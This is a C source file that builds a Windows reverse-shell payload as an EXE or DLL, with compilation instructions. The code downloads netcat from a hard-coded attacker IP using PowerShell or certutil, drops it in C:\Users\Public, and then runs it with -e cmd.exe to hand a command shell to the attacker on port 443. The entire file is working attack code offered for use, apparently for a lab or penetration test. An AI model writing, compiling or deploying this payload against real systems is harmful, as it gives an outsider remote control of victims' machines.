#include <stdlib.h>
#include <stdio.h>

#define ATTACKER_IP "10.10.15.88"
#define ATTACKER_PORT "443"

/*
* COMPILATION INSTRUCTIONS
* For x64 EXE file (standard): x86_64-w64-mingw32-gcc nc_shell.c -o payload.exe
* For x86 EXE file: i686-w64-mingw32-gcc nc_shell.c -o payload.exe
* For DLL file: x86_64-w64-mingw32-gcc -shared -o payload.dll nc_shell.c
*/

int main(void) {
    char downloadCmd[1024];
    char reverseShellCmd[512];

    // Download netcat if it doesn't exist
    snprintf(downloadCmd, sizeof(downloadCmd),
        "if not exist C:\\Users\\Public\\nc.exe (powershell -Command \"iwr -Uri http://%s/nc.exe -OutFile C:\\Users\\Public\\nc.exe\" "
        "|| certutil -urlcache -split -f http://%s/nc.exe C:\\Users\\Public\\nc.exe)",
        ATTACKER_IP, ATTACKER_IP);
    system(downloadCmd);

    // Build the reverse shell command using netcat
    snprintf(reverseShellCmd, sizeof(reverseShellCmd),
        "C:\\Users\\Public\\nc.exe %s %s -e cmd.exe",
        ATTACKER_IP, ATTACKER_PORT);
    system(reverseShellCmd);

    return 0;
}
